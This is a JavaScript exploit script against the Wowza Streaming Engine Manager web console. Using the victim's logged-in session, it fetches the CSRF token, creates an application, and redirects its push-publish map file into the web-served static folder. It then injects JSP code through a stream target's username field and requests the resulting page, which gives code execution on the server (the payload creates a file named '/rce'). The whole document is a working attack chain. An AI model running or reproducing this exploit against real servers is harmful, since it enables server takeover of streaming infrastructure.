async function hitPage(e) {
    const t = `${window.location.origin}/enginemanager/static/${e}.jsp`;
    try {
        const e = await fetch(t, {
            method: "GET",
            credentials: "include"
        });
        e.ok || console.error("failed to fetch targ:", e.status)
    } catch (e) {
        return console.error("error during fetch targ:", e), null
    }
}
async function getCSRFToken() {
    const e = `${window.location.origin}/enginemanager/Home.htm`;
    try {
        const t = await fetch(e, {
            method: "GET",
            credentials: "include"
        });
        if (!t.ok) return console.error("failed to fetch CSRF:", t.status), null;
        const o = await t.text(),
            a = new DOMParser,
            s = a.parseFromString(o, "text/html").querySelector('meta[name="wowzaSecurityToken"]');
        return s ? s.getAttribute("content") : (console.error("CSRF not found in resp"), null)
    } catch (e) {
        return console.error("error fetching CSRF:", e), null
    }
}
async function createApplication(e, t) {
    const o = window.location.origin,
        a = `${o}/enginemanager/applications/new.htm`,
        s = `uiAppName=${encodeURIComponent(e)}&ignoreWarnings=false&wowzaSecurityToken=${encodeURIComponent(t)}&vhost=_defaultVHost_&appType=LiveEdge&primaryURL=`;
    try {
        const e = await fetch(a, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
            },
            body: s,
            credentials: "include"
        });
        e.ok ? console.log("app create!") : console.error("failed app create:", e.status)
    } catch (e) {
        console.error("app error:", e)
    }
}
async function setApplicationProperties(e, t) {
    const o = `${window.location.origin}/enginemanager/applications/${encodeURIComponent(e)}/main/edit_adv.htm`,
        a = `vhost=_defaultVHost_&uiAppName=${encodeURIComponent(e)}&appType=${encodeURIComponent(e)}&section=main&advSection=Custom&customList%5B0%5D.documented=false&customList%5B0%5D.enabled=true&customList%5B0%5D.type=Boolean&customList%5B0%5D.sectionName=Application&customList%5B0%5D.section=%2FRoot%2FApplication&customList%5B0%5D.name=securityPublishRequirePassword&customList%5B0%5D.removed=false&customList%5B0%5D.uiBooleanValue=true&customList%5B1%5D.documented=false&customList%5B1%5D.enabled=true&customList%5B1%5D.type=String&customList%5B1%5D.sectionName=Application&customList%5B1%5D.section=%2FRoot%2FApplication&customList%5B1%5D.name=pushPublishMapPath&customList%5B1%5D.removed=false&customList%5B1%5D.value=%24%7Bcom.wowza.wms.context.VHostConfigHome%7D%2Fmanager%2Ftemp%2Fwebapps%2Fenginemanager%2Fstatic%2F${encodeURIComponent(e)}.jsp&advPath=%2FRoot%2FApplication&wowzaSecurityToken=${encodeURIComponent(t)}`;
    try {
        const e = await fetch(o, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
            },
            body: a, credentials: "include"
        });
        e.ok ? console.log("prop set!") : console.error("prop set fail:", e.status)
    } catch (e) {
        console.error("prop set error:", e)
    }
}
async function addStreamTarget(e, t) {
    const o = `${window.location.origin}/enginemanager/applications/${encodeURIComponent(e)}/streamtarget/add.htm`,
        a = `enabled=true&protocol=RTMP&destinationName=wowzastreamingengine&destApplicationRequired=true&destAppInstanceRequired=false&usernameRequired=false&passwordRequired=false&wowzaCloudDestinationType=&facebookUserName=&facebookAccessToken=&facebookDestName=&facebookDestId=&wowzaDotComFacebookUrl=https%3A%2F%2Ffb.wowza.com%2Fwsem%2Fstream_targets%2Fv2%2Fprod&wowzaFacebookAppId=670499806386098&wowzaCloudAdaptiveStreaming=true&protocolAkamai=RTMP&protocolShoutcast=shoutcast2&streamTargetName=x&sourceStreamName=x&sourceStreamNamePrefix=&shoutcastHost=&shoutcastPort=&shoutcastUsername=&shoutcastPassword=&shoutcastDestination=&shoutcastDescription=&shoutcastName=&shoutcastGenre=&shoutcastMetaFormat=&shoutcastURL=&shoutcastAIM=&shoutcastICQ=&shoutcastIRC=&_shoutcastPublic=on&destApplication=x&alibabaDestApplication=&destAppInstance=x&destHostRTMP=x&destPortRTMP=1935&destStreamNameRTMP=x&username=%3c%25%40+page+import%3d%27java.io.*%27+%25%3e%3c%25%40+page+import%3d%27java.util.*%27+%25%3e%3cspan%3ebbbaaaa%3c%2fspan%3e+%3c%25+StringBuilder+filePath+%3d+new+StringBuilder()%3b+filePath.append(%27%2f%27).append(%27r%27).append(%27c%27).append(%27e%27)%3b+String+concatFile+%3d+filePath.toString()%3b+File+file+%3d+new+File(concatFile)%3b+file.createNewFile()%3b+%25%3e&password=x&alibabaDestPortRTMP=1935&alibabaDestStreamNameRTMP=&akamaiStreamIdRTMP=&_akamaiSendToBackupServer=on&destStreamNameRTP=&destHostRTP=&videoPort=&audioPort=&streamWaitTimeout=5000&timeToLiveRTP=63&srtDestHost=&srtDestPort=&srtLatency=400&srtTooLatePacketDrop=true&_srtTooLatePacketDrop=on&srtTimestampBasedDeliveryMode=true&_srtTimestampBasedDeliveryMode=on&srtSendBufferSize=12058624&srtSendBufferSizeUDP=65536&srtMaximumSegmentSize=1500&srtFlightFlagSize=25600&srtMaximumBandwidth=-1&srtInputBandwidth=0&srtOverheadBandwidth=25&srtConnectTimeout=3000&srtStreamId=&srtPeerIdleTimeout=5000&srtTimesToPrintStats=0&srtKeyLength=AES-128&srtPassPhrase=&srtKeyRefreshRate=16777216&srtKeyAnnounce=4096&destStreamNameMPEGTS=&destHostMPEGTS=&destPortMPEGTS=1935&timeToLiveMPEGTS=63&_rtpWrap=on&destStreamNameHTTP=&destHostHTTPAkamai=&playbackHost=&akamaiStreamIdHTTP=&akamaiHostId=&httpPlaylistCount=0&akamaiEventName=&adaptiveGroup=&akamaiDestinationServer=primary&cupertinoRenditionAudioVideo=true&_cupertinoRenditionAudioVideo=on&_cupertinoRenditionAudioOnly=on&sanjoseRepresentationId=&mpegdashVideoRepresentationId=&mpegdashAudioRepresentationId=&facebookTitle=&facebookDescription=&facebook360Projection=none&facebookDestType=timeline&facebookPrivacy=onlyMe&wowzaVideoRegion=us&wowzaVideoTranscoderRegion=asia_pacific_australia&wowzaVideoTranscoderHeight=720&wowzaVideoTranscoderWidth=1280&wowzaVideoApiToken=&connectionCode=&_autoStart=on&wowzaCloudABRRadio=multiple&wowzaCloudDestinationServer=primary&debugLog=false&debugLogChildren=false&sendSSL=false&secureTokenSharedSecret=&adaptiveStreaming=false&sendFCPublish=true&sendReleaseStream=true&sendStreamCloseCommands=true&removeDefaultAppInstance=true&sendOriginalTimecodes=true&originalTimecodeThreshold=0x100000&connectionFlashVersion=&queryString=&localBindAddress=&debugPackets=false&akamaiHdNetwork=true&httpPlaylistAcrossSessions=false&httpPlaylistTimeout=120000&httpFakePosts=false&httpWriterDebug=false&wowzaSecurityToken=${encodeURIComponent(t)}&vhost=_defaultVHost_&appName=${encodeURIComponent(e)}&apiToken=`;
    try {
        const e = await fetch(o, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
            },
            body: a,
            credentials: "include"
        });
        e.ok ? console.log("stream target set!") : console.error("failed stream targ set:", e.status)
    } catch (e) {
        console.error("stream targ error:", e)
    }
}(async () => {
    const e = "PushPublishMap",
        t = await getCSRFToken();
    t && (await createApplication(e, t), await setApplicationProperties(e, t), await addStreamTarget(e, t), await hitPage(e))
})();
